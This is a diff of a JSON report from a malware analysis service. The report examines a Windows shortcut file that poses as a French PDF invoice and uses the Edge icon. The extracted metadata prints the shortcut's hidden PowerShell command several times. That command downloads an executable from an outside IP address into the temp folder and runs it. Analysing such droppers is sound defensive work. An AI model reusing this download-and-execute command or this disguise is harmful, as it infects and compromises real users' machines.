@@ -1,29 +1,145 @@
 {
-    "response": {
-        "supplementary": [
-            "dd0d30a45f5540b5b7021511f366b794791f0176ffd4337a26e3483d84b87634"
-        ],
-        "extracted": [
-            {
-                "name": "c52e1eb187.ps1",
-                "sha256": "c52e1eb1873da62ae87cd14fd4f20157f46924d33ac606805a99d0c18c39e96e"
-            }
-        ]
-    },
-    "result": {
-        "heuristics": [
-            1
-        ],
+  "extra": {
+    "drop_file": false,
+    "score": 750,
+    "sections": [
+      {
+        "auto_collapse": false,
+        "body": "{\"type\": \"colormap\", \"data\": {\"domain\": [0, 8], \"values\": [1.8540808080736912, 0.2761954276479391, 1.0834189322427712, 1.8540808080736912, 3.9754180179138325, 0.5489544344250401, 2.3437674223666716, 1.6016812830583902, 2.3437674223666716, 2.5802341939687476, 1.6016812830583902, 2.3437674223666716, 2.7152088061657307, 3.0589840894454263, 1.8540808080736912, 2.4849960987306523, 1.6016812830583902, 2.3437674223666716, 1.8540808080736912, 2.8433019459701496, 2.2485293271285762, 2.00633093059618, 2.153291231890481, 2.4849960987306527, 2.488785591776994, 2.4849960987306523, 2.7152088061657307, 2.4849960987306523, 2.7152088061657307, 2.5802341939687476, 2.619970710927636, 2.4849960987306527, 2.5840236870150894, 2.4849960987306523, 2.619970710927636, 2.4849960987306523, 2.7152088061657307, 2.484996098730652, 2.7152088061657302, 2.2585728843419157, 2.619970710927636, 2.484996098730652, 2.5840236870150894, 2.4849960987306527, 2.810446901403826, 2.484996098730652, 2.715208806165731, 2.5802341939687476, 1.896240625180289, 0]}}",
+        "body_format": "GRAPH_DATA",
+        "classification": "TLP:W",
+        "depth": 0,
+        "heuristic": null,
+        "tags": {},
+        "title_text": "File entropy: 3.604",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "{\"flags\": \"IDList, Description, RelativePath, WorkingDir, CommandArgs, IconFile, Unicode\", \"file_attributes\": \"Normal\", \"target_file_size\": 452608, \"icon_index\": 13, \"run_window\": \"Show Minimized No Activate\", \"hot_key\": \"(none)\", \"target_file_dosname\": \"powershell.exe\", \"description\": \"FACTURE-JUILLET2022#3476579.pdf\", \"relative_path\": \"./powershell.exe\", \"working_directory\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\", \"command_line_arguments\": \"Invoke-WebRequest -Uri 'http://20.7.43.70/BkRCY.exe' -OutFile $env:temp\\\\file.exe; set a=ec; start $env:temp\\\\file.exe\", \"icon_file_name\": \"C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\"}",
+        "body_format": "KEY_VALUE",
+        "classification": "TLP:W",
+        "depth": 0,
+        "heuristic": null,
+        "tags": {},
+        "title_text": "Metadata extracted by ExifTool",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": null,
+        "body_format": "TEXT",
+        "classification": "TLP:W",
+        "depth": 0,
+        "heuristic": null,
         "tags": {
-            "file.shortcut.icon_location": [
-                "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"
-            ],
-            "file.shortcut.command_line": [
-                "./powershell.exe Invoke-WebRequest -Uri 'http://20.7.43.70/BkRCY.exe' -OutFile $env:temp\\file.exe; set a=ec; start $env:temp\\file.exe"
-            ],
-            "file.name.extracted": [
+          "file": {
+            "name": {
+              "extracted": [
                 "./powershell.exe"
-            ]
+              ]
+            },
+            "shortcut": {
+              "command_line": [
+                "./powershell.exe Invoke-WebRequest -Uri 'http://20.7.43.70/BkRCY.exe' -OutFile $env:temp\\file.exe; set a=ec; start $env:temp\\file.exe"
+              ],
+              "icon_location": [
+                "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"
+              ]
+            }
+          }
+        },
+        "title_text": "Extra metadata extracted by LnkParse3",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "{\"icon_location\": \"C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\"}",
+        "body_format": "KEY_VALUE",
+        "classification": "TLP:W",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 4,
+          "score": 250,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {},
+        "title_text": "Suspicious icon used",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "{\"relative_path\": \"./powershell.exe\", \"target_file_dosname\": \"Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"}",
+        "body_format": "KEY_VALUE",
+        "classification": "TLP:W",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 1,
+          "score": 500,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {},
+        "title_text": "Suspicious command line arguments",
+        "zeroize_on_tag_safe": false
+      }
+    ]
+  },
+  "files": {
+    "extracted": [
+      {
+        "name": "c52e1eb187.ps1",
+        "sha256": "c52e1eb1873da62ae87cd14fd4f20157f46924d33ac606805a99d0c18c39e96e"
+      }
+    ],
+    "supplementary": [
+      {
+        "name": "features.json",
+        "sha256": "dd0d30a45f5540b5b7021511f366b794791f0176ffd4337a26e3483d84b87634"
+      }
+    ]
+  },
+  "results": {
+    "heuristics": [
+      {
+        "attack_ids": [],
+        "heur_id": 1,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 4,
+        "signatures": []
+      }
+    ],
+    "tags": {
+      "file.name.extracted": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "./powershell.exe"
         }
-    }
+      ],
+      "file.shortcut.command_line": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "./powershell.exe Invoke-WebRequest -Uri 'http://20.7.43.70/BkRCY.exe' -OutFile $env:temp\\file.exe; set a=ec; start $env:temp\\file.exe"
+        }
+      ],
+      "file.shortcut.icon_location": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"
+        }
+      ]
+    },
+    "temp_submission_data": {}
+  }
 }
